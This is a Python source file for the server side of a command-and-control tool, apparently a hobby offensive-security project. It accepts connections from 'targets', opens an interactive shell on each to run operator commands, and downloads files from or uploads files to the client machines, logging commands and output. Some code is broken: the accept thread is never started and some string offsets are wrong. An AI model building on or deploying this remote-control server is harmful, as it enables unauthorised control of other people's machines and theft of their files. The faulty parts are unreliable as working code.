#!/usr/bin/python3

from multiprocessing.connection import Client
import socket
import os
import platform
import pathlib
import hashlib
import datetime
import termcolor
import threading

# TODO:
#   1. Broadcast utility overhaul
#   2. Log file utility overhaul
#   3. Threads and locks implementation
#   4. Add 'offensive-python' project utilities:
#       a. Display alert when client is visiting a blacklisted website
#       b. Send heartbeat from client to server to verify it is alive
#       c. Display alert when duplicate mac address is found in the client's ARP table
#       d. Log all alerts as events (Should include: When, where & what happened)
#   5. Encryption implementation
#   6. Send platform data from client to sever upon request
#   7. Go over function docstrings
#   8. Read global variable values from json file upon flag usage

# SERVER_IP = socket.gethostbyname(socket.gethostname())  # Remote address
SERVER_IP = "0.0.0.0"
PORT = 1234  # Remote port
FORMAT = "utf-8"  # Message encoding format
HEADER_SIZE = 10  # Message header size
MAX_CONSECUTIVE = 5  # Max consecutive connection attempts
SEGMENT_SIZE = 1024  # Segment size when downloading / uploading files
TIMEOUT = 1  # Socket timeout when downloading / uploading files
LOG_PATH = str(pathlib.Path(__file__).parent.joinpath("c2.log"))  # Log file path
DOWNLOADS = pathlib.Path(__file__).parent  # Downloaded files destination path
CLIENTS = []  # Target list


def clr(msg):
    """Colors messages according to their content.

    :param msg: Message received in clear text
    :type msg: str
    :return: Recolored message in clear text
    :rtype: str
    """
    if msg[:3] == "[+]":  # Success indication
        return termcolor.colored(msg, "green")
    elif msg[:3] == "[*]":  # Informative message indication
        return termcolor.colored(msg, "yellow")
    else:  # Failure indication / Anything else
        return termcolor.colored(msg, "red")


def get_file_hash(data: list[bytes]) -> str:
    """
    Calculates a file md5 hash.

    :param data: File content split into segments
    :type data: list[bytes]
    :return: Md5 hash of the file
    :rtype: str
    """
    md5 = hashlib.md5()
    for chunk in data:
        md5.update(chunk)
    return md5.hexdigest()


def download_file(sock: socket.socket, path: str) -> None:
    """
    Downloads file from client to server.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param path: Target file path
    :type path: str
    :return: None
    """
    # Implemented segmentation when writing / receiving file data to avoid memory overload
    file_name = pathlib.Path(path).name  # File name without the full path
    dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
    original = sock.gettimeout()
    sock.settimeout(TIMEOUT)  # Set requested timeout
    original_md5 = ""
    result = ""
    data = []
    try:
        # Get client side status
        readable_src_file = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        if readable_src_file:  # File was read successfully on client side
            # Get original file hash
            original_md5 = sock.recv(32).decode(FORMAT)

            # Receive segmented file contents and write to destination file
            with open(dst, "wb") as f:
                segment = sock.recv(SEGMENT_SIZE)
                while segment:  # Keep receiving data until timeout
                    f.write(segment)
                    data.append(segment)  # Save written data for hash calculation
                    segment = sock.recv(SEGMENT_SIZE)
        else:  # Error finding / reading file on client side
            result = "FAILURE: FileNotFoundError / IOError"
            print(clr("[!] ERROR: File doesn't exist / Access denied"))
    except socket.timeout:  # Reached timeout, proceed to check file integrity
        # Calculate downloaded file hash
        result_md5 = get_file_hash(data)
        # Integrity verification
        if result_md5 == original_md5:
            result = f"SUCCESS: {dst}"
            print(f"{clr('[+] Download successful -')} {dst}")
        else:
            result = "FAILURE: Session timeout"
            print(clr("[!] ERROR: Timeout reached while downloading the file"))
    finally:
        sock.settimeout(original)  # Reset timeout value
        # Log attempt + result
        with open(LOG_PATH, "a") as log:
            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
            log.write(f"{prefix}\tDownload attempt for {path}, {result}\n")


def upload_file(sock: socket.socket, path: str) -> None:
    """
    Uploads file from server to client.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param path: Target file path
    :type path: str
    :return: None
    """
    # Implemented segmentation when reading / sending file data to avoid memory overload
    path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
    log_result = ""
    try:
        # Read target file in segments
        data = []
        with open(path, "rb") as f:
            chunk = f.read(SEGMENT_SIZE)
            while chunk:
                data.append(chunk)
                chunk = f.read(SEGMENT_SIZE)
        sock.send("1".ljust(HEADER_SIZE).encode(FORMAT))  # Signal: File contents were successfully read

        # Calculate & send file hash, later used for integrity verifications on server side
        md5 = get_file_hash(data)
        sock.send(md5.encode(FORMAT))

        # Send segmented file data
        for segment in data:
            if segment:
                sock.send(segment)
    except (FileNotFoundError, IOError):  # Signal: Error when trying tor ead from target file
        sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
    finally:
        # final result and message from the client side
        result = int(sock.recv(SEGMENT_SIZE).decode(FORMAT))
        message = sock.recv(SEGMENT_SIZE).decode(FORMAT).strip()
        if result:  # Successful upload
            dst = str(DOWNLOADS.joinpath(message))
            print(f"{clr('[+] Upload successful -')} {dst}")
            log_result = f"SUCCESS: {dst}"
        else:  # Upload failed
            # Print relevant error to match the final message received from the client side
            if message == "TIMEOUT":
                print(clr("[!] ERROR: Timeout reached while uploading the file"))
                log_result = "FAILURE: Session timeout"
            elif message == "ERROR":
                print(clr("[!] ERROR: File doesn't exist / Access denied"))
                log_result = "FAILURE: FileNotFoundError / IOError"
        # Log attempt + result
        with open(LOG_PATH, "a") as log:
            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
            log.write(f"{prefix}\tUpload attempt for {path}, {log_result}\n")


def recv_msg(sock: socket.socket, command: str) -> None:
    """
    Receives command output from the client and logs it within './c2.log'.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param command: Command executed on the client
    :type command: str
    :return: Command output received from the client
    :rtype: str
    """
    try:
        # Only receive the header and extract the message length
        msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        # Receive the message in its entirety
        output = sock.recv(msg_len).decode(FORMAT)
        # Unrecognized command
        if "is not recognized as an internal or external command" in output or "not found" in output:
            print(clr("[!] ERROR: Command not found"))
            print(clr('[*] HINT: The Target\'s OS is - ') + platform.system())
        elif "timed out after" in output:  # Command execution timeout on target
            print(clr("[!] ERROR: Command timed out"))
        elif command[:3] == "cd " and output == "":  # Changed directory successfully on client side
            pass
        else:  # Successful command execution resulting in output
            # Log command + output
            with open(LOG_PATH, "a") as log:
                # Log the command executed
                prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
                log.write(f"{prefix}\t{command}\n")

                # Log the output (indented)
                for line in output.splitlines():
                    log.write(f"{line}\n")

            # Print output on server side
            if output:
                print(output.strip())
    except ValueError:  # Received empty header (Client disconnected before sending a reply)
        pass


def send_msg(sock: socket.socket, command: str) -> None:
    """
    Sends a command to the client and prints its output.
    It can also broadcast the bash command to all targets if needed by triggering the 'broadcast' function.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param command: Command to run on the client
    :type command: str
    :return: None
    """
    # FIXME
    #     enable_broadcast = input(color_msg("[?] Would you like to broadcast your command? y/n ")).lower()
    #     if enable_broadcast == "y":
    #         broadcast(f"{msg_len:<{HEADER_SIZE}}" + msg)
    pass  # Place holder until broadcast utility is fixed
    # Send the message to the client, prefixed by a header of a set size
    # The header contains the message length padded by spaces (Used to ensure connection reliability)
    # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
    msg_len = len(command)
    sock.send((f"{msg_len:<{HEADER_SIZE}}" + command).encode(FORMAT))

    # Receive command output from the client side, if relevant
    if command not in ["quit", "exit", "clear"] and command[:9] != "download " and command[:7] != "upload ":
        recv_msg(sock, command)


# FIXME
#     def broadcast(msg):
#         """This function broadcasts a message to all available clients.
#         :param msg: Message in clear text
#         :type msg: str
#         :return: None
#         """
#         for client in CLIENTS:
#             try:
#                 client[0].send(msg.encode(FORMAT))
#                 print(color_msg("[!] Communicating with ") + str(client[1]))
#                 print(color_msg(recv_msg(client[0])))
#             except:
#                 print(color_msg("[!] Failed to send the message to - ") + str(client[1]))
#         print(color_msg("[*] Message sent to all available clients"))


def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
    """
    Received commands via input, and executes the appropriate action.

    :param sock: Client socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param addr: Client IPv4 address and port number
    :type addr: tuple[str, int]
    :return: None
    """
    try:
        maintain_session = True
        while sock:
            command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
            if command:
                send_msg(sock, command)
                # For certain keywords, run the appropriate action
                if command in ["quit", "exit"]:  # Quit current client CLI
                    maintain_session = False
                    break
                elif command in ["bg", "background"]:
                    break
                elif command[:3] == "cd ":  # Change directory on the client side
                    pass
                elif command == "clear":  # Clear server side console screen
                    os.system('cls' if os.name == 'nt' else 'clear')
                elif command[:9] == "download ":  # Download specified file from client side to server side
                    download_file(sock, command[9:])
                elif command[:7] == "upload ":  # Download specified file from server side to client side
                    upload_file(sock, command[9:])
    except ConnectionError as err:  # Socket connection error
        print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
    finally:
        # Close & remove sock from clients list if user exists with 'exit' / 'quit'
        # Do nothing if user exists with 'background' / 'bg'
        if sock and not maintain_session:
            sock.close()
            CLIENTS.remove((sock, addr))

def display_sessions() -> None:
    """
    Prints a table of all connected clients.

    :return: None
    """
    header = "ID\tCONNECTION\tADDRESS"
    print(header)
    print("-" * len(header))
    for i, session in enumerate(CLIENTS):
        info = f"{i}\t{session[0]}\t{session[1]}"
        print(info)
        print(len(info))


def accept_new_connections(s: socket.socket) -> None:
    """
    Constantly accepts new connections if possible, and saves information about new connections.

    :param s: Server side bound socket object
    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: None
    """
    while True:
        sock, addr = s.accept()
        # Save new connection information
        if (sock, addr) not in CLIENTS:
            CLIENTS.append((sock, addr))
        print(clr("[+] Connected to ") + str(addr))


def handle_connections(s: socket.socket) -> None:
    """
    Listens for clients and accepts incoming connections.

    :param s: Server side bound socket object
    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: None
    """
    s.listen(5)
    sock = ""
    try:
        print(f"\n{clr('[*] Server is running on -')} {SERVER_IP}")
        print(f"{clr('[*] Listening for incoming connections...')}")
        # Accept connections in a seperate thread to avoid blocking the terminal
        thread = threading.Thread(target=accept_new_connections, args=(s))

        # User terminal for session handling
        while True:
            command = input(termcolor.colored("> ", "red"))
            if command == "sessions":
                display_sessions()
            elif command[:10] == "sessions -i ":
                i = command[10:]
                if i.isdigit():
                    if len(CLIENTS) > int(i) > 0:
                        # Start a command line interface for the specified client
                        shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
                    else:
                        print(f"{clr('[!] ERROR: The specified index is out of range')}")
                else:
                    print(f"{clr('[!] ERROR: The specified index is not an integer')}")
            elif command in ["exit", "quit"]:
                break
    except KeyboardInterrupt:
        pass
    finally:
        if sock:
            sock.close()



def main() -> None:
    """
    Main function for the C&C server side.

    :return: None
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Enable address reuse
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Establish server side
    s.bind((SERVER_IP, PORT))
    try:
        handle_connections(s)
    except KeyboardInterrupt:
        pass
    finally:
        if s:
            s.close()
        print("""\n
             ██████   ██████   ██████  ██████  ██████  ██    ██ ███████
            ██       ██    ██ ██    ██ ██   ██ ██   ██  ██  ██  ██
            ██   ███ ██    ██ ██    ██ ██   ██ ██████    ████   █████
            ██    ██ ██    ██ ██    ██ ██   ██ ██   ██    ██    ██
             ██████   ██████   ██████  ██████  ██████     ██    ███████""")


if __name__ == "__main__":
    print("""
     ██████    ██     ██████     ██████  ██████   ██████       ██ ███████  ██████ ████████
    ██         ██    ██          ██   ██ ██   ██ ██    ██      ██ ██      ██         ██
    ██      ████████ ██          ██████  ██████  ██    ██      ██ █████   ██         ██
    ██      ██  ██   ██          ██      ██   ██ ██    ██ ██   ██ ██      ██         ██
     ██████ ██████    ██████     ██      ██   ██  ██████   █████  ███████  ██████    ██



    ███████ ███████ ██████  ██    ██ ███████ ██████      ███████ ██ ██████  ███████
    ██      ██      ██   ██ ██    ██ ██      ██   ██     ██      ██ ██   ██ ██
    ███████ █████   ██████  ██    ██ █████   ██████      ███████ ██ ██   ██ █████
         ██ ██      ██   ██  ██  ██  ██      ██   ██          ██ ██ ██   ██ ██
    ███████ ███████ ██   ██   ████   ███████ ██   ██     ███████ ██ ██████  ███████""")
    try:
        main()
    except KeyboardInterrupt:
        pass
